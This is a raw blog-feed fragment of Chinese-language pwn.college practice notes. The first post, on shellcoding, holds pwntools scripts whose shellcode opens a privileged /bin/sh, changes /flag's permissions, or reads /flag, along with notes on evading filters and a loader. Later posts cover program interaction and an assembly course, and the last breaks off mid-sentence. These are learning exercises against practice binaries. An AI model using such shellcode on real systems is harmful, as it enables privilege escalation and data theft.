class="hljs-string">&quot;/bin/sh&quot;</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">&quot;</span><br><br>shellcode = asm(shellcode)<br><br><span class="hljs-keyword">p</span>.send(shellcode)<br><br><span class="hljs-keyword">p</span>.interactive()<br><br></code></pre></td></tr></table></figure><p>调试：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">context<span class="hljs-selector-class">.arch</span> = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context<span class="hljs-selector-class">.log_level</span> = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]</span><br><br>gdb<span class="hljs-selector-class">.attach</span>(sh) <br><br>gdb&gt; <span class="hljs-attribute">display</span>/xg <span class="hljs-variable">$rbp</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-keyword">p</span> = process(<span class="hljs-string">&#x27;/challenge/babyshell_level5&#x27;</span>)<br><br>shellcode = <span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">&quot;</span><br>    jmp two<br>one:<br>    <span class="hljs-keyword">pop</span> rdi<br><br>    push <span class="hljs-number">0</span>x0<br>    push <span class="hljs-number">0</span>x702d<br>    push rsp<br>    <span class="hljs-keyword">pop</span> rdx<br>    <br>    push <span class="hljs-number">0</span>x0<br>    push rdx<br>    push rdi<br>    push rsp<br>    <span class="hljs-keyword">pop</span> rsi<br>    <br>    push <span class="hljs-number">0</span>x0<br>    <span class="hljs-keyword">pop</span> rdx<br>    push <span class="hljs-number">0</span>x3b<br>    <span class="hljs-keyword">pop</span> rax<br>    <br>    push <span class="hljs-number">0</span>x050e<br>    inc qword <span class="hljs-keyword">ptr</span> [rsp]<br>    jmp rsp<br>    nop<br>two:<br>    <span class="hljs-keyword">call</span> one<br>    .<span class="hljs-built_in">string</span> <span class="hljs-string">&quot;/bin/bash&quot;</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">&quot;</span><br><br>shellcode = asm(shellcode)<br><br><span class="hljs-keyword">p</span>.send(shellcode)<br><br><span class="hljs-keyword">p</span>.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>pathname 指向要执行的程序路径。<br>argv 是一个字符串数组，包含要传递给程序的所有参数，第一个参数通常是程序名。<br>envp 是一个环境变量字符串数组，此处可以为 NULL。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pathname, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[], <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> envp[])</span></span>;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> *args[] = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-literal">NULL</span>&#125;;<br>    <span class="hljs-keyword">char</span> *env[] = &#123;<span class="hljs-literal">NULL</span>&#125;;<br><br>    execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, args, env);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs asm"><br>section .text<br>    global _start<br><br>_start:<br>    ; /bin/sh 字符串<br>    mov rax, &#x27;/bin//sh&#x27;    ; //bin/sh 字符串（8 字节反转）<br>    push rax<br><br>    ; 构造参数数组<br>    mov rdi, rsp           ; 第一个参数：程序名 (/bin/sh)<br>    push rdi               ; 参数数组第一个元素 (指向 /bin/sh)<br>    mov rax, 0x702d        ; -p 字符串 (反转，但只有两字节)<br>    push rax               ; 参数数组第二个元素 (-p)<br>    mov rsi, rsp           ; 第二个参数：指向参数数组<br><br>    push 0                 ; 参数数组的结束标志 NULL<br>    mov rdx, rsp           ; 第三个参数：环境变量数组 (NULL)<br><br>    ; 调用 execve 系统调用<br>    mov rax, 59            ; execve 的系统调用号为 59<br>    syscall                ; 执行系统调用<br><br>    ; 退出程序<br>    mov rax, 60            ; exit 的系统调用号为 60<br>    xor rdi, rdi           ; 退出码 0<br>    syscall                ; 执行系统调用<br><br></code></pre></td></tr></table></figure><h1 id="6"><a href="#6" class="headerlink" title="6"></a>6</h1><h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><p>Write and execute shellcode to read the flag, but all file descriptors (including stdin, stderr and stdout!) are closed.</p><p>把 flag 属性更改即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><span class="hljs-comment">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level7&#x27;</span>)<br><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rax, 0x67616c662f </span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rsi, 0777</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 90</span><br><span class="hljs-string"></span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 60</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>shellcode = asm(shellcode)<br><br>p.send(shellcode)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><ul><li><code>0x</code> 前缀表示十六进制。例如，<code>mov rax, 0x67616c662f</code> 将将十六进制数 <code>0x67616c662f</code> 赋值给 <code>rax</code> 寄存器。</li><li><code>0</code> 前缀表示八进制。例如，<code>mov rsi, 0777</code> 将八进制数 <code>0777</code>（对应十进制数 <code>511</code>）赋值给 <code>rsi</code> 寄存器。</li><li>没有前缀的数值默认为十进制。例如，<code>mov rax, 90</code> 将十进制数 <code>90</code> 赋值给 <code>rax</code> 寄存器。</li></ul><h1 id="8"><a href="#8" class="headerlink" title="8"></a>8</h1><h1 id="9"><a href="#9" class="headerlink" title="9"></a>9</h1><h1 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h1><h2 id="小端序"><a href="#小端序" class="headerlink" title="小端序"></a>小端序</h2><p>根据小端序，</p><p>mov  ebx, “xyz#”</p><p>shl  ebx, 8 </p><p>shr  ebx, 8的结果是什么？</p><p>如果是push “xyz#”的话，x 在最低位，#在最高位（地址）</p><p>mov  ebx, “xyz#”相当于把”xyz#”放到内存，然后 mov 指令将内存拷贝到寄存器，因此#是最高地址</p><p><a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82%E5%BA%8F">https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82%E5%BA%8F</a></p><ul><li>注意到push的操作数只能是32位/64数</li></ul><h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><p>得到一个shell：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>):<br>mov rax, <span class="hljs-number">59</span><span class="hljs-comment"># this is the syscall number of execve</span><br>lea rdi, [rip+binsh]<span class="hljs-comment"># points the first argument of execve at the /bin/sh string below</span><br>mov rsi, <span class="hljs-number">0</span><span class="hljs-comment"># this makes the second argument, argv, NULL</span><br>mov rdx, <span class="hljs-number">0</span><span class="hljs-comment"># this makes the third argument, envp, NULL</span><br>syscall<span class="hljs-comment"># this triggers the system call</span><br>binsh:<span class="hljs-comment"># a label marking where the /bin/sh string is</span><br>.<span class="hljs-keyword">string</span> <span class="hljs-string">&quot;/bin/sh&quot;</span><br></code></pre></td></tr></table></figure><p>注意这里的<code>[rip+binsh]</code>, binsh是相对于直行道第三行的rip的偏移</p><p>代码中混入数据的方法：</p><ul><li>.byte 0x48, 0x45, 0x4C, 0x4C, 0x4F  # “HELLO” </li><li>.string “HELLO”  # <code>&quot;HELLO\0&quot;</code></li></ul><p>或者是把指向数据的指针压栈</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x0068732f6e69622f</span>  # move <span class="hljs-string">&quot;/bin/sh\0&quot;</span> <span class="hljs-keyword">into</span> <span class="hljs-built_in">rbx</span><br><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span>  # <span class="hljs-keyword">push</span> <span class="hljs-string">&quot;/bin/sh\0&quot;</span> onto the stack<br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span>  # point <span class="hljs-built_in">rdi</span> <span class="hljs-meta">at</span> the stack<br></code></pre></td></tr></table></figure><p>shellcode 的别的用法</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sendfile</span>(<span class="hljs-number">1</span>, open(<span class="hljs-string">&quot;/flag&quot;</span>, NULL), <span class="hljs-number">0</span>, <span class="hljs-number">1000</span>)//`sendfile` 是一个用于在两个文件描述符之间直接传输数据的系统调用,将文件描述符 <span class="hljs-number">1</span>（标准输出）作为目标文件描述符，`open(<span class="hljs-string">&quot;/flag&quot;</span>, NULL)` 返回的文件描述符作为源文件描述符<br></code></pre></td></tr></table></figure><p>使用完整的汇编语言编写</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>.intel_syntax <span class="hljs-keyword">noprefix</span><br><span class="hljs-keyword"></span>mov rax, <span class="hljs-number">59</span><span class="hljs-comment"># this is the syscall number of execve</span><br>lea rdi, [rip+<span class="hljs-keyword">binsh]</span><span class="hljs-comment"># points the first argument of execve at the /bin/sh string below</span><br>mov rsi, <span class="hljs-number">0</span><span class="hljs-comment"># this makes the second argument, argv, NULL</span><br>mov rdx, <span class="hljs-number">0</span><span class="hljs-comment"># this makes the third argument, envp, NULL</span><br><span class="hljs-keyword">syscall</span><span class="hljs-comment"># this triggers the system call</span><br><span class="hljs-keyword">binsh:</span><span class="hljs-comment"># a label marking where the /bin/sh string is</span><br>.string <span class="hljs-string">&quot;/bin/sh&quot;</span><br><br></code></pre></td></tr></table></figure><p>下面该加载器使用了<code>mmap</code>函数来分配一块内存页，然后使用<code>read</code>函数从标准输入中读取shellcode的内容，并将其写入分配的内存页中。最后，通过将内存页转换为函数指针并调用它，执行加载的shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 使用mmap函数分配一块内存页，起始地址为0x1337000，大小为0x1000字节（4KB）</span><br>page = mmap(<span class="hljs-number">0x1337000</span>, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 使用read函数从标准输入中读取shellcode的内容，并将其写入分配的内存页中</span><br>read(<span class="hljs-number">0</span>, page, <span class="hljs-number">0x1000</span>);<br><br><span class="hljs-comment">// 将内存页的地址转换为函数指针，并调用该函数指针，执行加载的shellcode</span><br>((<span class="hljs-keyword">void</span>(*)())page)();<br><br></code></pre></td></tr></table></figure><p><strong>调试shellcode</strong></p><ul><li>strace ./shellcode-elf</li><li>gdb ./shellcode-elf</li><li><code>x/5i $rip</code>：打印当前指令地址 <code>$rip</code> 开始的下5条指令的汇编代码。</li><li><code>x/gx $rsp</code>：以qword（8字节）为单位查看栈指针 <code>$rsp</code> 指向的内存内容。</li><li><code>x/2dx $rsp</code>：以dword（4字节）为单位查看栈指针 <code>$rsp</code> 指向的内存内容。</li><li><code>x/4hx $rsp</code>：以halfword（2字节）为单位查看栈指针 <code>$rsp</code> 指向的内存内容。</li><li><code>x/8b $rsp</code>：以byte（1字节）为单位查看栈指针 <code>$rsp</code> 指向的内存内容。</li><li><code>si</code>：单步执行一条指令，如果遇到 <code>call</code> 指令，会进入被调用函数内部。</li><li><code>ni</code>：单步执行一条指令，如果遇到 <code>call</code> 指令，会跳过被调用函数，直接执行下一条指令。</li><li><code>break *0x400000</code>：在地址 <code>0x400000</code> 处设置一个断点。</li><li><code>run</code> 或 <code>continue</code>：运行程序，直到遇到断点或程序结束。</li><li><code>reverse execution</code>：反向执行程序，可以回溯到之前的状态。</li></ul><p>在AMD64架构的shellcode中，字母”H”比其他字母更加显眼的原因是因为它是一个特殊的前缀字节。AMD64架构旨在与x86架构保持向后兼容，以便能够在实践中真正被采用。在AMD64处理器上执行的x86代码将完全像在x86处理器上执行一样。大部分情况下，AMD64架构是一个纯粹的扩展，由一个前缀字节”H”来控制。</p><p>然而，有一个例外，即在AMD64架构中，push和pop指令可以直接操作64位值（如rax等），而无需前缀字节。</p><p>int 3 <strong>对应的是0xCC</strong><br>但是下面的方法可以绕过：</p><ul><li><code>inc BYTE PTR [rip]</code></li><li>.byte 0xcb ;加一就是CC<br>前提是需要确保text段可写</li></ul><p><strong>x86和amd64的系统调用异同</strong>：</p><ul><li>int 0x80</li><li>syscall</li></ul><p><strong>内存访问的位数大小</strong>：</p><table><thead><tr><th>single byte:</th><th>mov [rax], bl</th></tr></thead><tbody><tr><td>2-byte word:</td><td>mov [rax], bx</td></tr><tr><td>4-byte dword:</td><td>mov [rax], ebx</td></tr><tr><td>8-byte qword:</td><td>mov [rax], rbx</td></tr></tbody></table><p>有时需要特别标注大小</p><table><thead><tr><th>single byte</th><th>mov BYTE PTR [rax], 5</th></tr></thead><tbody><tr><td>2-byte word:</td><td>mov WORD PTR [rax], 5</td></tr><tr><td>4-byte dword:</td><td>mov DWORD PTR [rax], 5</td></tr><tr><td>8-byte qword:</td><td>mov QWORD PTR [rax], 5</td></tr></tbody></table><p><strong>不同架构的shellcode</strong></p><ol><li>在amd64架构上编译和运行shellcode：<ul><li>编译命令：<code>gcc -nostdlib -static shellcode.s -o shellcode-elf</code></li><li>运行命令：<code>./shellcode</code></li></ul></li><li>在mips架构上编译和运行shellcode：<ul><li>编译命令：<code>mips-linux-gnu-gcc -nostdlib shellcode-mips.s -o shellcode-mips-elf</code></li><li>运行命令：<code>qemu-mips-static ./shellcode-mips</code></li></ul></li></ol><p>对于qemu模拟器，您可以使用一些有用的选项来调试和跟踪系统调用：</p><ul><li><code>-strace</code>：打印系统调用的日志，类似于strace工具的功能。</li><li><code>-g 1234</code>：在端口1234上等待gdb连接。在gdb-multiarch中使用<code>target remote localhost:1234</code>命令连接到模拟器进行调试。</li></ul><p><strong>一个示例的多架构shellcode的设计思路</strong>：</p><ol><li>将eax寄存器的值压入栈中（在x86和amd64上具有相同的操作码）。</li><li>检查esp寄存器向左移动32位或64位后的值（在x86和amd64上具有相同的操作码）。</li><li>如果移动后的值为32位，跳转到32位shellcode；如果为64位，跳转到64位shellcode。</li></ol><p>这种策略利用了x86和amd64架构中一些指令的相似性，使得可以在不同的架构上执行相应的shellcode。</p><p><strong>现代架构支持内存权限控制</strong>：</p><ul><li>PROT_READ 允许进程读取内存</li><li>PROT_WRITE 允许进程写入内存</li><li>PROT_EXEC 允许进程执行内存</li></ul><p>所以游戏结束了吗？</p><p><strong>使用mprotect()系统调用可以将内存设置为可执行：</strong>  </p><ul><li>欺骗程序调用mprotect(PROT_EXEC)来执行我们的shellcode<ul><li>最常见的方法是通过返回导向编程（Return Oriented Programming）进行代码重用</li></ul></li><li>跳转到shellcode</li></ul><p><strong>即时编译（Just in Time Compilation）</strong> </p><ul><li>即时编译器需要生成（并经常重新生成）要执行的代码。  </li><li>用于代码生成的页面必须是可写的。  </li><li>用于执行的页面必须是可执行的。  </li><li>用于代码重新生成的页面必须是可写的。</li></ul><p>The safe thing to do would be to:</p><ul><li>mmap(PROT_READ|PROT_WRITE)<ul><li>分配可读可写</li><li>write the code</li></ul></li><li>mprotect(PROT_READ|PROT_EXEC)<ul><li>execute</li></ul></li><li>mprotect(PROT_READ|PROT_WRITE)<ul><li>update code</li></ul></li><li>etc…</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn college 刷题记录：program interaction</title>
    <link href="/p/a6c34954/"/>
    <url>/p/a6c34954/</url>
    
    <content type="html"><![CDATA[<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>前几题都比较简单，</p><ul><li>父子进程通信（fork、execve等函数）</li><li>信号机制</li><li>管道机制</li><li>C语言、shell脚本、python语言处理包括上面主题的输入输出问题</li></ul><h1 id="Lectures-and-Reading"><a href="#Lectures-and-Reading" class="headerlink" title="Lectures and Reading"></a>Lectures and Reading</h1><p>来自slides</p><p>讲述了：</p><ul><li>elf section header</li><li>进程的生命周期（fork）</li><li>执行过程（加载）</li><li>进程的内存布局</li><li>系统调用（system call）</li><li>信号（signals）</li></ul><p>further reading</p><ul><li><a href="https://intezer.com/blog/malware-analysis/executable-linkable-format-101-part-2-symbols/">Executable and Linkable Format 101. Part 2: Symbols</a></li><li><a href="https://www.rozmichelle.com/pipes-forks-dups/">Pipes, Forks, &amp; Dups: Understanding Command Execution and Input/Output Data Flow | rozmichelle</a></li><li><a href="https://www.binarytides.com/socket-programming-c-linux-tutorial/">Socket programming in C on Linux - The Ultimate Guide for Beginners - BinaryTides</a></li><li><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-4.html">How the Linux kernel runs a program · Linux Inside</a></li></ul><h1 id="起手式"><a href="#起手式" class="headerlink" title="起手式"></a>起手式</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ps</span> <span class="hljs-literal">-p</span> <span class="hljs-variable">$</span><span class="hljs-variable">$</span> <span class="hljs-comment"># 检测父进程</span><br><br>/chellenge/emxxx<br></code></pre></td></tr></table></figure><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>要求 embryoio_level1 的父进程是bash</p><p>直接运行程序即可</p><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>进入/usr/bin/bash</p><p>运行程序</p><p>卡住，输入密码即可</p><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>进入/usr/bin/bash</p><p>运行/challenge/embryoio_level3 vnafzqlxec即可</p><h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p>进入/usr/bin/bash（后面就省略这一句了）</p><p>export yqxjyb=isdvinxiir</p><p>运行二进制文件</p><h1 id="5"><a href="#5" class="headerlink" title="5"></a>5</h1><p>输入重定向<br>echo ztikhrrc &gt; /tmp/inujwj</p><p>/challenge/embryoio_level5 &lt; /tmp/inujwj</p><h1 id="6"><a href="#6" class="headerlink" title="6"></a>6</h1><p>输出重定向</p><p>/challenge/embryoio_level6 &gt; /tmp/enhwpg</p><p>cat /tmp/enhwpg</p><h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><p>清除所有环境变量</p><p>env -i /challenge/embryoio_level</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn college 刷题记录：assembly crash course</title>
    <link href="/p/344bba9e/"/>
    <url>/p/344bba9e/</url>
    
    <content type="html"><![CDATA[<p>汇编，太美丽辣</p><span id="more"></span><p><img src="/image/pwn-college.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>用python的pwn库解题会非常方便。建议读读pwn库的官方文档，写的已经非常清楚了<ul><li>pwntools太好用了</li><li>顺便发现了readallS的输出比readall更友好</li></ul></li><li>总的来说学习了基本的汇编程序的编写（赋值、运算、分支、循环等基本操作），以及label、rept之流的运用，栈内存布局等</li></ul><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>设置寄存器</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs arduino">要与任何级别进行交互，您需要通过标准输入(stdin)发送原始字节给该程序。  <br>为了高效地解决这些问题，首先运行程序以查看挑战说明。  <br>然后编写、汇编并将字节传输到该程序。<br><br>例如，如果您在 <span class="hljs-keyword">asm</span>.S 文件中编写了汇编代码，可以将其汇编为目标文件：  <br>as -o <span class="hljs-keyword">asm</span>.o <span class="hljs-keyword">asm</span>.S<br><br>然后，您可以将 .text 段（您的代码）复制到 <span class="hljs-keyword">asm</span>.bin 文件中：  <br>objcopy -O binary --only-section=.text <span class="hljs-keyword">asm</span>.o <span class="hljs-keyword">asm</span>.bin<br><br>最后，将其发送给挑战程序：  <br>cat ./<span class="hljs-keyword">asm</span>.bin | /challenge/run<br><br>您甚至可以将其作为一个命令运行：  <br>as -o <span class="hljs-keyword">asm</span>.o <span class="hljs-keyword">asm</span>.S &amp;&amp; objcopy -O binary --only-section=.text ./<span class="hljs-keyword">asm</span>.o ./<span class="hljs-keyword">asm</span>.bin &amp;&amp; cat ./<span class="hljs-keyword">asm</span>.bin | /challenge/run<br><br>在这个级别中，您将使用寄存器。您将被要求修改或读取寄存器的内容。<br><br>在这个级别中，您将使用寄存器！请设置以下内容：  <br>rdi = <span class="hljs-number">0x1337</span><br><br>请以字节形式提供您的汇编代码（最多<span class="hljs-number">0x1000</span>字节）：<br></code></pre></td></tr></table></figure><p>汇编-》字节码的过程</p><p>题目提示可以使用as命令得到程序的text的节段，然后用16进制编辑器查看，但是还是pwn库比较方便</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># 设置架构</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># 创建一个进程对象 运行二进制文件</span><br>p=process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><span class="hljs-comment"># 发送数据</span><br>p.send(asm(<span class="hljs-string">&#x27;mov rdi,0x1337&#x27;</span>))<br><span class="hljs-comment"># 打印输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>设置多个寄存器</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs arduino">欢迎来到 ASMLevel2<br>==================================================<br><br>要与任何关卡进行交互，您需要通过标准输入将原始字节发送给该程序。<br>为了有效地解决这些问题，首先运行程序以查看挑战说明。<br>然后编写、汇编并将字节传输到该程序。<br><br>例如，如果您将汇编代码编写在 <span class="hljs-keyword">asm</span>.S 文件中，可以将其汇编为目标文件：<br>  as -o <span class="hljs-keyword">asm</span>.o <span class="hljs-keyword">asm</span>.S<br><br>然后，您可以将 .text 段（您的代码）复制到 <span class="hljs-keyword">asm</span>.bin 文件中：<br>  objcopy -O binary --only-section=.text <span class="hljs-keyword">asm</span>.o <span class="hljs-keyword">asm</span>.bin<br><br>最后，将其发送到挑战程序：<br>  cat ./<span class="hljs-keyword">asm</span>.bin | /challenge/run<br><br>您甚至可以将其作为一个命令运行：<br>  as -o <span class="hljs-keyword">asm</span>.o <span class="hljs-keyword">asm</span>.S &amp;&amp; objcopy -O 